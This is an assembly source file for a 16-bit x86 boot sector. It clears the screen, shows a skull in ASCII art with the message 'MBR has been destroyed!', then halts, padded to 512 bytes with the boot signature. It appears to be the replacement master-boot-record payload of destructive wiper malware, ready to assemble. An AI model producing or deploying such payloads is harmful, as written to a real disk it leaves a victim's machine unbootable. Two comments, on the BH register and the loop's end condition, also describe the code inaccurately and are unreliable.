;---------------------------------------------------

.386						; Compile for a 80386 CPU
option segment:use16		; Force 16 bit segments instead of default 32 bit
.model tiny					; Tiny memory model
.code						; Start of code segment
org 07C00h					; Bootloader entry point
;---------------------------------------------------

start:
    mov ah, 06h        ; Clear screen and set attributes in one go
    mov bh, 04h        ; Page number for video functions
    xor al, al         ; Number of lines by which to scroll up (00h = clear entire window)
    xor cx, cx         ; Row,column of window's upper left corner
    mov dx, 184Fh      ; Row,column of window's lower right corner
    int 10h

    lea si, ascii_art  ; Load address of ascii_art
    ; Print characters until line break (0Dh,0Ah)
_loop:
    lodsb              ; Load byte at SI into AL, increment SI
    test al, al		   ; Check if al==0 a NULL byte
    jz _quit           ; Yes, quit
	mov ah, 0Eh        ; Function: Teletype output
    int 10h            ; Print character
    jmp _loop          ; Continue printing characters

_quit:
    hlt                ; Halt the system
	
ascii_art db "          uuUUUUUUUUuu          ",0Dh,0Ah
          db "     uuUUUUUUUUUUUUUUUUUuu     ",0Dh,0Ah
          db "    uUUUUUUUUUUUUUUUUUUUUUu    ",0Dh,0Ah
          db "  uUUUUUUUUUUUUUUUUUUUUUUUUUu  ",0Dh,0Ah
          db "  uUUUUUUUUUUUUUUUUUUUUUUUUUu  ",0Dh,0Ah
          db "  uUUUU       UUU       UUUUu  ",0Dh,0Ah
          db "   UUU        uUu        UUU   ",0Dh,0Ah
          db "   UUUu      uUUUu     uUUU   ",0Dh,0Ah
          db "    UUUUuuUUU     UUUuuUUUU    ",0Dh,0Ah
          db "     UUUUUUU       UUUUUUU     ",0Dh,0Ah
          db "       uUUUUUUUuUUUUUUUu        ",0Dh,0Ah
          db "           uUUUUUUUu           ",0Dh,0Ah
          db "         UUUUUuUuUuUUU         ",0Dh,0Ah
          db "           UUUUUUUUU  ",0Dh,0Ah
          db 0Dh,0Ah   ; Double line break
          db "MBR has been destroyed!",0Dh,0Ah
		  db 00h
db 510-($-start) dup(0)
dw 0AA55h
end start
